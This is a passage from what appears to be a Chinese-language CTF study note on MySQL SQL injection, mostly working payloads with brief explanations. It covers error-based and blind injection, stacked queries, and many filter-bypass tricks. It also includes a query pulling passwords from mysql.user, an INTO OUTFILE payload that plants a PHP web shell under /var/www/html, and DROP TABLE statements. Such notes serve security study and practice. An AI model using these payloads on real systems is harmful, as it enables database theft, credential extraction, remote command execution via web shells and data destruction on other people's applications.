updatexml(1,concat(&#x27;~&#x27;,substr((select column_name from table_name), 1 , 31)),3)--</span><br><span class="line"># 或</span><br><span class="line">-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select password from mysql.user where user=&#x27;mituan&#x27;) , 1 , 31)),3) --</span><br></pre></td></tr></table></figure><p>过滤<code>updatexml</code>那就用<code>extractvalue</code></p><h2 id="无列注入"><a class="header-anchor" href="#无列注入">¶</a>无列注入</h2><p>通过 join 建立两个表之间的内连接, 也就是说跟给列赋别名有点相似，就是在取别名的同时查询数据进行查询时语句的字段数必须和指定表中的字段数一样，不能多也不能少，不然就会报错</p><h2 id="盲注"><a class="header-anchor" href="#盲注">¶</a>盲注</h2><h3 id="布尔盲注"><a class="header-anchor" href="#布尔盲注">¶</a>布尔盲注</h3><ul><li>存在回显1, 不存在回显0</li><li>输入不存在的用户名会输出用户不存在, 否则输出密码错误</li></ul><p>测试用语句:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition, value_if_true, value_if_false)</span><br><span class="line">if(2&gt;1,1,0)</span><br><span class="line"># 直接判断是否存在盲注, 或者结合load_file()对文件内容内容进行判断, 即当存在时返回0, 不存在时返回1</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a class="header-anchor" href="#时间盲注">¶</a>时间盲注</h3><p>测试用语句:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=if(2&gt;1,sleep(5),1)&amp;debug=1</span><br><span class="line"># 可以感觉到差不多延时5s, 就证明存在盲注</span><br></pre></td></tr></table></figure><p>构造payload用的函数:</p><h2 id="堆叠注入"><a class="header-anchor" href="#堆叠注入">¶</a>堆叠注入</h2><p>利用分号使得原语句和构造的语句都执行一次, union联合查询是两个查询一起执行, 所以才需要类似-1这种让前面的查询无回显</p><p>堆叠注入最大的特点就是可直接执行命令, 所以可以更改判断条件的变量使得我们绕过这个判断;</p><p>此处利用的就是update更新数据库:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=0;update user set pass=1&amp;password=1</span><br></pre></td></tr></table></figure><blockquote><p>有时候结合handler进行注入</p></blockquote><h1>绕过</h1><p>当 database 被过滤, 可以访问一个不存在的数据库来返回数据库名</p><p>当column被过滤, 用 join 无列注入</p><p>假如 updatexml 被过滤, 可以替换为 extractvalue, extractvalue 函数只能显示返回的32个字符串,结合 substr 等使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;~&#x27;(select database()))));</span><br><span class="line">1&#x27; and (extractvalue(&#x27;anything&#x27;,concat(&#x27;/&#x27;,(select database()))));</span><br><span class="line">1&#x27; and (extractvalue(&#x27;anything&#x27;,concat(&#x27;~&#x27;,substring((select database()),1,5))));</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br><span class="line"># 访问不存在的数据库来返回数据库, 或者将||换成or,爆库。</span><br><span class="line">1&#x27;||(select * from aa)#</span><br><span class="line"></span><br><span class="line"># 获取数据库内表</span><br><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="过滤or-and-xor"><a class="header-anchor" href="#过滤or-and-xor">¶</a>过滤or and xor</h2><table><thead><tr><th>原字符串</th><th>替换字符串</th></tr></thead><tbody><tr><td>and</td><td>&amp;&amp;</td></tr><tr><td>or</td><td>||</td></tr><tr><td>not</td><td>!</td></tr><tr><td>xor</td><td>|</td></tr></tbody></table><h2 id="过滤in和not-in"><a class="header-anchor" href="#过滤in和not-in">¶</a>过滤in和not in</h2><p>假如一个表有三行, 不能查看1只能查看2,3就用not in, 只会显示1的内容</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><h2 id="过滤空格"><a class="header-anchor" href="#过滤空格">¶</a>过滤空格</h2><p>在select语句外</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双空格</span><br><span class="line">/**/</span><br><span class="line">括号绕过</span><br><span class="line">回车代替(//ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a)</span><br><span class="line">%09</span><br><span class="line">%20</span><br><span class="line">%0A</span><br><span class="line">%0C</span><br><span class="line">%0D</span><br><span class="line">%0B</span><br><span class="line">%A0</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;</span><br><span class="line">\x20</span><br></pre></td></tr></table></figure><p>在select语句内</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 反引号</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select`password`from`user`where`username`=&#x27;flag&#x27;),3%23</span><br><span class="line"># 单引号</span><br><span class="line">-1&#x27;/**/union/**/select&#x27;1&#x27;,(select`password`from`user`where`username`=&#x27;flag&#x27;),3%23</span><br><span class="line"># 括号</span><br><span class="line">username=-1&#x27;,(select(group_concat(flag))from(flagb)))%23</span><br></pre></td></tr></table></figure><h2 id="过滤select"><a class="header-anchor" href="#过滤select">¶</a>过滤select</h2><p>基本就是过滤了联合注入, 但是可以用or</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="返回值过滤"><a class="header-anchor" href="#返回值过滤">¶</a>返回值过滤</h2><p>规定返回的值不能有特定内容</p><ul><li>过滤字符串</li></ul><p>过滤字符串这种就加一层编码就行, 比如md5, sha, hax等等</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id,hex(username),password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>过滤数字</li></ul><p>过滤所有数字的就需要加点东西了, 可以用replace嵌套去替代数字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span> </span><br><span class="line">s = <span class="string">f&quot;replace(password,<span class="subst">&#123;i&#125;</span>,&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(i)) + <span class="number">55</span>)&#125;</span>&#x27;)&quot;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>): </span><br><span class="line">    s = <span class="string">f&quot;replace(<span class="subst">&#123;s&#125;</span>,<span class="subst">&#123;i&#125;</span>,&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(i)) + <span class="number">55</span>)&#125;</span>&#x27;)&quot;</span> </span><br><span class="line"><span class="built_in">print</span>(s) </span><br></pre></td></tr></table></figure><p>还原脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;ctfshow&#123;fgggaeje-lljd-kkjd-ojoo-akhdefbmdlbb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag = flag.replace(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(i)) + <span class="number">55</span>), <span class="built_in">str</span>(i))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><ul><li>过滤所有字符<code>\x00-\x7f</code></li></ul><p>这种时候考虑外带, 写在文件中, 给网站写个马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select username,password from user into outfile &#x27;/var/www/html/flag.txt&#x27;%23</span><br><span class="line"></span><br><span class="line">-1&#x27;union select 1,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27;%23</span><br></pre></td></tr></table></figure><h2 id="substr函数"><a class="header-anchor" href="#substr函数">¶</a>substr函数</h2><ul><li>mid 函数绕过, 但是注意 mid 多数时候只在 MySQL 中使用</li></ul><p><code>MID( column_name , start , length)</code>, substr同下</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>要提取字符的字段</td></tr><tr><td>start</td><td>规定开始位置</td></tr><tr><td>length</td><td>可选,要返回的字符数,不填则返回剩余字符串</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MID(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span># 查看数据库名第一位</span><br><span class="line">MID(DATABASE(),<span class="number">2</span>,<span class="number">1</span>)# 查看数据库名第二位, 依次查看各位字符</span><br></pre></td></tr></table></figure><ul><li><p>left 函数绕过</p><p>Left ( string, n )    string为要截取的字符串, n为长度</p></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span># 查看数据库名第一位</span><br><span class="line"><span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">&gt;</span><span class="string">&#x27;ab&#x27;</span># 查看数据库名前二位</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">### 关键词替换为空</span><br><span class="line"></span><br><span class="line">部分过滤是<span class="keyword">select</span>等关键词, 关键词短语替换为空,可以用双写绕过</span><br><span class="line"><span class="keyword">union</span> <span class="operator">-</span><span class="operator">&gt;</span> uniunionon</span><br><span class="line"></span><br><span class="line">### 过滤等号</span><br><span class="line"></span><br><span class="line">使用 <span class="keyword">like</span>, rlike, regexp, <span class="operator">&lt;</span> , <span class="operator">&gt;</span>替代</span><br><span class="line">```<span class="keyword">sql</span></span><br><span class="line"><span class="keyword">select</span> ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">115</span>;</span><br><span class="line"><span class="keyword">select</span> ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) rlike <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">&#x27;^ro&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="过滤注释符"><a class="header-anchor" href="#过滤注释符">¶</a>过滤注释符</h2><p>利用闭合的方式查询, 主要还是靠查询语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union%0cselect&#x27;1&#x27;,2,&#x27;3</span><br><span class="line"></span><br><span class="line">-1&#x27;%0cor%0cusername=&#x27;flag</span><br><span class="line"></span><br><span class="line">-1&#x27;union%0cselect&#x27;1&#x27;,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="过滤sleep"><a class="header-anchor" href="#过滤sleep">¶</a>过滤sleep</h2><ol><li><p><code>benchmark()</code></p><p><code>benchmark()</code>是Mysql的一个内置函数,其作用是来测试一些函数的执行速度</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(执行的次数, 要执行的函数或者是表达式)</span><br><span class="line">benchmark(1500000,md5(1))</span><br></pre></td></tr></table></figure><p>执行不同的次数那么执行的时间也就不一样, 通过这个函数我们可以达到与<code>sleep()</code>同样的延时目的</p></li><li><p>笛卡尔积</p><p>通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算</p><blockquote><p>没有使用任何连接条件的两个表, 数据库会执行笛卡尔积操作</p></blockquote><p>所以可以用下面这个替代sleep:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(select count(*) from ((information_schema.columns)A, (information_schema.columns)B, (information_schema.columns limit 1,7)c) limit 1)</span><br></pre></td></tr></table></figure></li><li><p>get_lock 加锁</p></li><li><p>超长字符串连接</p></li></ol><h2 id="过滤数字"><a class="header-anchor" href="#过滤数字">¶</a>过滤数字</h2><p>可以用str构造数字和字母</p><p><a href="https://dev.mysql.com/doc/refman/8.4/en/string-functions.html">String Functions and Operators</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select true+true;# 返回2</span><br><span class="line">select concat((true+true),(true+true));# 返回22</span><br><span class="line">select concat((true+true),(true+true),&#x27;f&#x27;);# 返回22f</span><br><span class="line">select false;# 返回0</span><br><span class="line">select concat(false);# 返回0</span><br></pre></td></tr></table></figure><p>可用脚本可以看 ctfshow web185</p><h2 id="过滤information-schema"><a class="header-anchor" href="#过滤information-schema">¶</a>过滤information_schema</h2><p>参考文章</p><ul><li><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></li></ul><p>那些拼接就不管了, 主要是替代品</p><blockquote><p>mysql默认存储引擎innoDB携带的表:</p></blockquote><p>利用<code>innodb_table_stats</code>代替<code>information_schema</code>, <code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>, 两表均有<code>database_name</code>和<code>table_name</code>字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表 banlist,user,flag</span><br><span class="line">password=1\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#</span><br></pre></td></tr></table></figure><h2 id="传入变量后解码"><a class="header-anchor" href="#传入变量后解码">¶</a>传入变量后解码</h2><p>可以整个payload编码一次, 或者直接闭合整个语句后拼接</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部分查询语句</span></span><br><span class="line">where ip = <span class="title function_ invoke__">from_base64</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="comment"># 传入的参数</span></span><br><span class="line">?id=<span class="string">&#x27;1&#x27;</span>) <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">2</span>&gt;<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="限制传入参数长度"><a class="header-anchor" href="#限制传入参数长度">¶</a>限制传入参数长度</h2><p>利用泄露的账号密码可以登陆, 如果没有, 就只能靠其他方面的弱点了</p><p>比如说没有单引号包裹啊, 或者存在下面这种:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以利用select 来设置<code>$row[0]</code>的值, 从而绕过判断</p><h2 id="通配符绕过"><a class="header-anchor" href="#通配符绕过">¶</a>通配符绕过</h2><p>sql的通配符是<code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or username like&#x27;%fla%</span><br></pre></td></tr></table></figure><h2 id="ascii-字符对比绕过"><a class="header-anchor" href="#ascii-字符对比绕过">¶</a>ascii 字符对比绕过</h2><p>如果对 union select 进行拦截 而且似乎怎么都绕不过去, 那么可以不使用联合查询注入, 可以使用字符截取对比法</p><p>感觉就是盲注</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>;</span><br><span class="line"># 最好把<span class="string">&#x27;r&#x27;</span>换成成 ascii 码</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>;</span><br></pre></td></tr></table></figure><h2 id="二次编码绕过"><a class="header-anchor" href="#二次编码绕过">¶</a>二次编码绕过</h2><p>有些程序会解析二次编码,大部分情况下, 绕过 gpc 字符转义 和 waf 的拦截</p><h2 id="拼接绕过"><a class="header-anchor" href="#拼接绕过">¶</a>拼接绕过</h2><p>简单拆一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,(&#x27;selec&#x27;,&#x27;t * from flag&#x27;), 3%23</span><br></pre></td></tr></table></figure><h2 id="多函数拆分绕过"><a class="header-anchor" href="#多函数拆分绕过">¶</a>多函数拆分绕过</h2><p>多余多个参数拼接到同一条 SQL 语句中, 可以将注入语句分割插入。</p><p>例如请求 get 参数:a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中。条件:在程序代码中看到两个可控的参数, 但是使用 union select 会被 waf 拦截。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="number">1</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uername&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]:<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where id = &#x27;<span class="subst">$id</span>&#x27; and username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入 -1&#x27; union/*&amp;username=*/select 1,user(),3,4--+</span></span><br><span class="line"><span class="comment">//查询语句会变为 select *from users where id=&#x27;-1&#x27; union/*&#x27; and username=&#x27;*/select 1,user(),3,4--&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="select语句变形变形"><a class="header-anchor" href="#select语句变形变形">¶</a>select语句变形变形</h2><p>查阅mysql官网<a href="https://dev.mysql.com/doc/refman/8.4/en/select.html">SELECT Statement</a>查看有什么可以替换的</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">having</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">having</span> username regexp(<span class="number">0x666c6167</span>)</span><br><span class="line"># flag的十六进制</span><br></pre></td></tr></table></figure><h2 id="特殊字符串"><a class="header-anchor" href="#特殊字符串">¶</a>特殊字符串</h2><p>详情见ctfshow web187</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>这个时候<code>ffifdyop</code>就会派上用场</p><p>在经过md5假面之后该字符串会变成<code>'or'6</code>加上不可见字符, 这样就构建了一个永真的判断</p><p>而在查询语句中, 只要字符串头出现数字就可以构造永真判断:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 不可行</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line"># 可行</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6aaaa&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="变量未包裹"><a class="header-anchor" href="#变量未包裹">¶</a>变量未包裹</h2><p>在查询变量没有单引号包裹的时候, 会自动进行字符类型转换; 首字符是字母转换过来就是0, 首字符是数字就会匹配输入的数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240810205728809.png" alt="image-20240810205728809"></p><p>所以提交<code>username=0</code>, 就可以通过一些判断</p><h2 id="删除-更新表"><a class="header-anchor" href="#删除-更新表">¶</a>删除/更新表</h2><p>可以很长, 又不能联合注入, 而且没有通过单引号包含传入的参数, 尝试执行相关命令: 更新表或者删除后新建一个一样的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 删除ctfshow_user表</span><br><span class="line">drop table users;</span><br><span class="line"># 创建一个新的表user</span><br><span class="line">create table users(`username` varchar(100),`pass` varchar(100));</span><br><span class="line"># 用于向user表插入一条数据</span><br><span class="line">insert users(`username`,`pass`) value(1,2);</span><br></pre></td></tr></table></figure><h2 id="sqlmap"><a class="header-anchor" href="#sqlmap">¶</a>sqlmap</h2><p>这个见[[sqlmap]]笔记, 里面有更详细的使用方法</p><h2 id="handler语句"><a class="header-anchor" href="#handler语句">¶</a>handler语句</h2><p>参考文章:</p><ul><li><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">MySQL 之 handler 的详细使用及说明</a></li><li><a href="https://blog.51cto.com/u_16099241/10499216">HANA mysql使用场景 mysql handler的作用</a></li></ul><p><code>handler语句</code>让我们能够一行一行的浏览一个表中的数据, 但是它仅在<code>mysql</code>存在且不包含<code>select</code>函数的完整功能;</p><p>最堆叠注入中, 基本上结合我们的show就可以绕过大部分过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">1&#x27;;show tables;%23</span><br><span class="line"># 查内容</span><br><span class="line">1&#x27;;handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;%23</span><br></pre></td></tr></table></figure><h2 id="预处理"><a class="header-anchor" href="#预处理">¶</a>预处理</h2><p>预处理就是定义一串sql查询语句为一个名字, 然后直接通过这个名字来运行该查询语句</p><p>标准格式如下, 有时候需要去掉那个&quot;删除预定义语句&quot;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;   </span><br><span class="line"># 预定义SQL语句</span><br><span class="line">EXECUTE name;  </span><br><span class="line"># 执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  </span><br><span class="line">#删除预定义SQL语句</span><br></pre></td></tr></table></figure><p>可以用十六进制替代部分参数, 比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prepare h from 0x73686f77207461626c6573;execute h;</span><br></pre></td></tr></table></figure><blockquote><p>例题可以看ctfshow web225</p></blockquote><h2 id="转译符号"><a class="header-anchor" href="#转译符号">¶</a>转译符号</h2><p>利用转译符号去掉特定的单引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;,username=database()#&#x27;</span><br><span class="line"># 等价于</span><br><span class="line">update ctfshow_user set pass = &#x27;x&#x27;,username=database()#&#x27;</span><br></pre></td></tr></table></figure><h2 id="存储过程和函数"><a class="header-anchor" href="#存储过程和函数">¶</a>存储过程和函数</h2><p>参考文章:</p><ul><li><a href="https://zhuanlan.zhihu.com/p/649802945">mysql之存储过程和存储函数</a></li><li><a href="https://blog.csdn.net/uftjtt/article/details/80435520">mysql存储过程和函数总结</a></li><li><a href="https://cloud.tencent.com/developer/article/2153139">MySQL 进阶之存储过程/存储函数/触发器</a></li></ul><p>这个似乎也归类在堆叠注入</p><h2 id="妙妙工具"><a class="header-anchor" href="#妙妙工具">¶</a>妙妙工具</h2><p><code>username=0;show tables&amp;password=user</code>, 这个可以绕过下面这个</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>其他注入</h1><h2 id="Limit注入"><a class="header-anchor" href="#Limit注入">¶</a>Limit注入</h2><p>可参考的文献:</p><ul><li><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">P神转载-Mysql下Limit注入方法</a></li><li><a href="https://www.jianshu.com/p/6c1420a7a7d9">mysql注入之limit注入</a></li></ul><blockquote><p>此方法适用于MySQL 5.x中，在limit语句后面的注入</p></blockquote><p>在官方的select语句解释中, <code>limit</code>后可以跟<code>procedure</code>和<code>into</code>, 可以利用<code>procedure</code>进行注入, 通常结合报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br></pre></td></tr></table></figure><h2 id="Group-by注入"><a class="header-anchor" href="#Group-by注入">¶</a>Group by注入</h2><p>可参考的文章:</p><ul><li><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">CTF-sql-mysql group by报错注入</a></li></ul><p>似乎有报错注入和盲注两种方法</p><h2 id="Floor-报错注入"><a class="header-anchor" href="#Floor-报错注入">¶</a>Floor()报错注入</h2><p>一般用在同时过滤<code>updatexml</code>和<code>extractvalue</code>的情况下</p><p>参考文章:</p><ul><li><a href="https://blog.csdn.net/qq_63844103/article/details/128569910">floor报错注入</a></li><li><a href="https://www.freebuf.com/articles/web/257881.html">关于floor()报错, 你真的懂了吗</a></li></ul><p>如果上面三个全部都过滤了, 换一下函数就可以了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">floor()向下取整</span><br><span class="line">ceil()向上取整</span><br><span class="line">round()四舍五入</span><br></pre></td></tr></table></figure><h2 id="Update注入"><a class="header-anchor" href="#Update注入">¶</a>Update注入</h2><p>利用子查询将结果更新到可见表中, 也是一种拼接</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查库 web</span><br><span class="line">password=1&#x27;,username=database()#&amp;username=1</span><br><span class="line"># 查表 banlist,user,flag</span><br><span class="line">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1</span><br><span class="line"># 查列 id,flag,info</span><br><span class="line">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)#&amp;username=1</span><br><span class="line"># 查字段</span><br><span class="line">password=1&#x27;,username=(select flag from web.flag) where 1=1#&amp;username=1</span><br></pre></td></tr></table></figure><h2 id="Insert注入"><a class="header-anchor" href="#Insert注入">¶</a>Insert注入</h2><p>和Update注入大差不差, 只不过这次是插入数据</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表：</span><br><span class="line">username=123&#x27;,(select group_concat(table_name) from information_schema.tables where 